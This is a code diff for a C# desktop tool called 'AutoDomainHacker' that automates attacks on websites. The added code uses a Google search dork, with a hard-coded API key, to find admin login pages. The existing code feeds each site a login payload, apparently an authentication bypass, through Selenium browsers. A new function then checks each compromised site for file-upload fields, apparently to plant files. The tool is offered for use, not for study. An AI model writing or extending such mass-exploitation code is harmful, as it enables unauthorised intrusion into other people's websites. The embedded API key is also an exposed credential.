@@ -1,16 +1,17 @@
-﻿using OpenQA.Selenium;
+﻿using Newtonsoft.Json;
+using OpenQA.Selenium;
 using OpenQA.Selenium.Chrome;
 using OpenQA.Selenium.Firefox;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
+using System.Net;
 using System.Threading;
 using System.Threading.Tasks;
-using System.Windows;
 using System.Windows.Forms;
 
-namespace AutoDomainHacker
+namespace ADH
 {
     public partial class Home : Form
     {
@@ -130,6 +131,34 @@ namespace AutoDomainHacker
 
         private void Form1_Load(object sender, EventArgs e)
         {
+            string apiKey = "AIzaSyATqgfNiFlONRH7LJ9nJievRLXWfO917r0";
+            string cx = "de291e86fb9d1f014";
+            string q = "inurl:\" /login.php \" intext:admin";
+            string lg = "in";
+            int start = 1; 
+            var request = WebRequest.Create("https://www.googleapis.com/customsearch/v1?key=" + apiKey + "&cx=" + cx + "&q=" + q +"&start="+start +"&lg="+lg);
+            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
+            Stream dataStream = response.GetResponseStream();
+            StreamReader reader = new StreamReader(dataStream);
+            string responseString = reader.ReadToEnd();
+            dynamic jsonData = JsonConvert.DeserializeObject(responseString);
+
+            //var results = new List<CustomSearchResultModel>();
+            var results = new List<string>();
+            List<string> links = new List<string>();
+            foreach (var item in jsonData.items)
+            {
+                string link = item.link;
+                links.Add(link);
+                //results.Add(new CustomSearchResultModel
+                //{
+                //    Title = item.title,
+                //    Link = item.link,
+                //    Snippet = item.snippet,
+                //});
+            }
+
+
             comboBox1.SelectedIndex = 0;
             comboBox2.SelectedIndex = 0;
             comboBox3.SelectedIndex = 0;
@@ -300,12 +329,6 @@ namespace AutoDomainHacker
                 IWebDriver chromeDriver = CreateChromeDriver(false);
                 IWebDriver firefoxDriver = CreateFirefoxDriver(false);
 
-                //chromeDriver.Manage().Window.Size = new System.Drawing.Size(100, 200);
-                //chromeDriver.Manage().Window.Position = new System.Drawing.Point(0,0);
-                //int screenWidth = int.Parse(SystemParameters.FullPrimaryScreenWidth.ToString());
-                //firefoxDriver.Manage().Window.Position = new System.Drawing.Point(0, screenWidth - 200);
-                //chromeDriver.Manage().Window.Size = new System.Drawing.Size(100, 200);
-
                 Invoke(new Action(() => listView3.Items.Clear())); 
 
                 string[] domains = File.ReadAllText(label8.Text).Trim().Split('\n');
@@ -320,13 +343,21 @@ namespace AutoDomainHacker
                         firefoxDriver.Dispose();
                         return;
                     }
-                    string[] line = data.Split(new String[] { "|" }, 2, StringSplitOptions.None);
+                    string[] line = data.Split(new [] { "|" }, 2, StringSplitOptions.None);
                     Uri uri = new Uri(line[0].Trim());
                     string domain = uri.Scheme + "://" + uri.Host;
                     string loginUrl = line[0].Trim();
                     string payload = line[1].Trim().Split('|')[0];
 
                     Login(chromeDriver, loginUrl, payload);
+                    if(FindUploadPointAtHomePage(chromeDriver))
+                    {
+                        Invoke(new Action(() => {
+                            listView3.Items.Add(domain);
+                            listView3.Items[listCounter].SubItems.Add("Found at Home Page");
+                            listView3.Items[listCounter].SubItems.Add(chromeDriver.Url);
+                        }));
+                    }
                     Login(firefoxDriver, loginUrl, payload);
 
                     List<string> urls = FindAllUrls(chromeDriver, domain);
@@ -462,6 +493,18 @@ namespace AutoDomainHacker
             }
             catch (Exception) { }
         }
+        private bool FindUploadPointAtHomePage(IWebDriver driver)
+        {
+            try
+            {
+                IWebElement webElement = driver.FindElement(By.CssSelector("input[type = file]"));
+                return true;
+            }
+            catch (Exception)
+            {
+                return false;
+            }
+        }
         private List<string> FindAllUrls(IWebDriver driver, string domain)
         {
             //Find all admin urls
@@ -477,7 +520,6 @@ namespace AutoDomainHacker
             }
             return urls;
         }
-
 
 
 
